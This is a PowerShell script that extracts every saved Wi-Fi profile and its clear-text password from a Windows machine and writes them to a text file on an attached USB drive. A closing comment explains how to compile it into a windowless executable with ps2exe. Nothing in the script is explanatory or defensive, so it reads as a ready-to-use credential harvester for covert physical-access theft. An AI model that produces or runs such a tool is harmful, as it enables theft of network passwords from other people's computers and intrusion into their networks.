# Get all Wi-Fi profiles
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.Line.Split(":")[1].Trim()
}

# Initialize a StringBuilder to store the Wi-Fi credentials
$wifiCredentials = New-Object System.Text.StringBuilder
$wifiCredentials.AppendLine("SSID : PASSWORD")

# Loop through each profile and extract the password
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $passwordLine = $profileDetails | Select-String "Key Content"

    if ($passwordLine) {
        $password = $passwordLine.Line.Split(":")[1].Trim()
    } else {
        $password = "No password found"
    }

    $wifiCredentials.AppendLine("$profile : $password")
}

# Identify the USB drive
$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1

if (-not $usbDrive) {
    [System.Windows.MessageBox]::Show("No USB drive detected. Please insert a USB drive and try again.")
    exit
}

# Path to save the Wi-Fi credentials file
$filePath = "$($usbDrive.DeviceID)\wifi_credentials.txt"

# Save the Wi-Fi credentials to the file
$wifiCredentials.ToString() | Out-File -FilePath $filePath -Encoding UTF8

# to compile this file: ps2exe -noconsole -inputFile your_script.ps1 -outputFile your_script.exe
